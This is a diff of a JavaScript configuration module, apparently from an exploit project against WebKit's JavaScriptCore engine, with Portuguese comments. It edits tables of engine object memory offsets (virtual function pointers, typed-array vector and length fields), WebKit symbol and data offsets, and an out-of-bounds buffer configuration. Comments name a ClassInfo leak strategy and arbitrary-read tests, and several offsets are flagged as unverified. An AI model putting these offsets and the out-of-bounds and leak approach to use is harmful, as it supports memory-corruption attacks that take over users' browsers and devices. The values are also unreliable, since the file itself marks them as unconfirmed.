@@ -24,7 +24,8 @@ export const JSC_OFFSETS = {
         TYPE_INFO_MORE_FLAGS_OFFSET: 0xA,
         TYPE_INFO_INLINE_FLAGS_OFFSET: 0xC,
         AGGREGATED_FLAGS_OFFSET: 0x10,
-        VIRTUAL_PUT_OFFSET: 0x18,  
+        VIRTUAL_PUT_OFFSET: 0x18, // CANDIDATO FORTE PARA PONTEIRO DE FUNÇÃO VIRTUAL (ex: JSObject::put)
+        PROPERTY_STORAGE_CAPACITY_OFFSET: 0x18, // Nota: Mesmo offset que VIRTUAL_PUT_OFFSET, isso é incomum. VERIFIQUE. Se for diferente, ajuste.
         PROPERTY_TABLE_OFFSET: 0x20,
         GLOBAL_OBJECT_OFFSET: 0x28,
         PROTOTYPE_OFFSET: 0x30,
@@ -40,6 +41,9 @@ export const JSC_OFFSETS = {
     },
     JSCallee: { 
         GLOBAL_OBJECT_OFFSET: 0x10, // VALIDADO
+    },
+    ClassInfo: { // NOVO: Adicionado para a estratégia de vazamento de ClassInfo
+        M_CACHED_TYPE_INFO_OFFSET: 0x8, // Offset comum para m_cachedTypeInfo dentro de ClassInfo. VERIFIQUE!
     },
     ArrayBuffer: {
         CONTENTS_IMPL_POINTER_OFFSET: 0x10, // VALIDADO
@@ -57,10 +61,10 @@ export const JSC_OFFSETS = {
     ArrayBufferView: { // Para TypedArrays como Uint8Array, Uint32Array, DataView
         STRUCTURE_ID_OFFSET: 0x00,      // Relativo ao início do JSCell do ArrayBufferView
         FLAGS_OFFSET: 0x04,             // Relativo ao início do JSCell do ArrayBufferView
-        ASSOCIATED_ARRAYBUFFER_OFFSET: 0x08, 
-        CONTENTS_IMPL_POINTER_OFFSET: 0x10, 
-        M_VECTOR_OFFSET: 0x10,          
-        M_LENGTH_OFFSET: 0x18,          
+        ASSOCIATED_ARRAYBUFFER_OFFSET: 0x08, // Ponteiro para o JSArrayBuffer.
+        CONTENTS_IMPL_POINTER_OFFSET: 0x10, // Ponteiro para ArrayBufferContents (redundante se já tem ASSOCIATED_ARRAYBUFFER_OFFSET?) ou diferente? Verifique.
+        M_VECTOR_OFFSET: 0x10,          // Se CONTENTS_IMPL_POINTER_OFFSET acima for o correto, M_VECTOR_OFFSET pode ser relativo a ArrayBufferContents, não à View.
+        M_LENGTH_OFFSET: 0x18,          // Comprimento da view.
         M_MODE_OFFSET: 0x1C
     },
     ArrayBufferContents: {
@@ -74,12 +78,6 @@ export const JSC_OFFSETS = {
     VM: {
         TOP_CALL_FRAME_OFFSET: 0x9E98, // VALIDADO
     },
-    // NOVO: OFFSET DA TABELA DE ESTRUTURAS. ESTE VALOR É UM PLACEHOLDER E PRECISA SER ENCONTRADO
-    STRUCTURE_TABLE_OFFSET_FROM_WEBKIT_BASE: 0x3000000, 
-    
-    // NOVO: ENDEREÇO BASE ASSUMIDO DA WEBKIT PARA TESTES DE LEITURA ARBITRÁRIA.
-    // ESTE É UM VALOR ESPECULATIVO E PRECISA SER ENCONTRADO EM DUMPS OU POR OUTROS MEIOS.
-    ASSUMED_WEBKIT_BASE_FOR_TEST: "0x7FFF00000000", // <<<< ESTE VALOR É CRÍTICO E PRECISA SER VALIDADO/AJUSTADO.
 };
 
 export const WEBKIT_LIBRARY_INFO = {
@@ -113,7 +111,7 @@ export const WEBKIT_LIBRARY_INFO = {
         "JSC::throwConstructorCannotBeCalledAsFunctionTypeError": "0x112BBC0",
     },
     DATA_OFFSETS: {
-        "JSC::JSArrayBufferView::s_info": "0x3AE5040", // OFFSET DA SEÇÃO .data
+        "JSC::JSArrayBufferView::s_info": "0x3AE5040",
         "JSC::DebuggerScope::s_info": "0x3AD5670",
         "JSC::Symbols::Uint32ArrayPrivateName": "0x3CC7968",
         "JSC::Symbols::Float32ArrayPrivateName": "0x3CC7990",
@@ -123,13 +121,12 @@ export const WEBKIT_LIBRARY_INFO = {
 };
 
 export let OOB_CONFIG = {
-    ALLOCATION_SIZE: 1048576, // Para o  v10.36, você aumentou para 1MB. Mantenha o valor desejado.
+    ALLOCATION_SIZE: 1048576,
     BASE_OFFSET_IN_DV: 128,
     INITIAL_BUFFER_SIZE: 32
 };
 
 export function updateOOBConfigFromUI(docInstance) {
-    // ... (sem alterações)
     if (!docInstance) return;
     const oobAllocSizeEl = docInstance.getElementById('oobAllocSize');
     const baseOffsetEl = docInstance.getElementById('baseOffset');
